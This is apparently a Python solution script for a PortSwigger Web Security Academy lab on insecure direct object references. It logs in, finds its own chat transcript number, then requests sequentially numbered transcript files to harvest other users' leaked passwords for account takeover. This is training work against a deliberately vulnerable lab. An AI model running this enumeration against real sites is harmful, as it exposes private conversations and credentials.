# Lab 11 — Insecure direct object references
# PortSwigger: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references
#
# Vulnerability: Chat transcripts are stored as sequentially-numbered static
#                files (1.txt, 2.txt...) served with no ownership check
# Aim:           Find carlos's password via a leaked chat transcript
#
# Technique:
#   Send a chat message to get your own transcript link (e.g. /download-
#   transcript/12.txt). Nothing verifies that the requesting session owns
#   that specific numbered file — iterate through earlier numbers to find
#   other users' transcripts.
#
# Usage: python access_control_lab11.py <url>

import sys
import re
import urllib3
from proxies import proxies
from access_control_utils import banner, section, make_session, login, print_box, get_csrf_from_response

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 11 — INSECURE DIRECT OBJECT REFERENCES (CHAT TRANSCRIPTS)")

    if len(sys.argv) != 2:
        print("  Usage: python access_control_lab11.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: send a chat message to get a transcript number to anchor from ─
    print("\n  ── Step 1: send a chat message to obtain our own transcript number\n")
    chat_page = session.get(f"{url}/chat")
    csrf = get_csrf_from_response(chat_page.text)

    data = {"csrf": csrf, "message": "test message"} if csrf else {"message": "test message"}
    r_chat = session.post(f"{url}/chat", data=data)

    match = re.search(r'/download-transcript/(\d+)\.txt', r_chat.text)
    if not match:
        print("  ✘  Could not find our own transcript link automatically.")
        print("     Use the live chat in a browser, then note the transcript")
        print("     number from the 'View transcript' link, and set START below.")
        own_id = 20  # fallback guess — adjust per lab instance
    else:
        own_id = int(match.group(1))
        print(f"  ✔  Our own transcript number: {own_id}\n")

    # ── Step 2: iterate downward through earlier transcript numbers ─────────
    print(f"  ── Step 2: iterate transcripts 1.txt through {own_id}.txt for leaked passwords\n")

    found = []
    for i in range(1, own_id):
        r = session.get(f"{url}/download-transcript/{i}.txt")
        if r.status_code == 200 and "password" in r.text.lower():
            print(f"  ✔  {i}.txt contains a password reference")
            found.append((i, r.text))

    if not found:
        print("  ✘  No transcripts mentioned a password in this range.")
        print("     Try a wider range, or check transcripts manually.")
        sys.exit(1)

    # ── Step 3: show the leaked content ───────────────────────────────────────
    for i, content in found:
        print_box(f"TRANSCRIPT {i}.txt", content[:500])

    print("  ℹ  Look for a line like 'my password is ...' and use it to log in as carlos.")
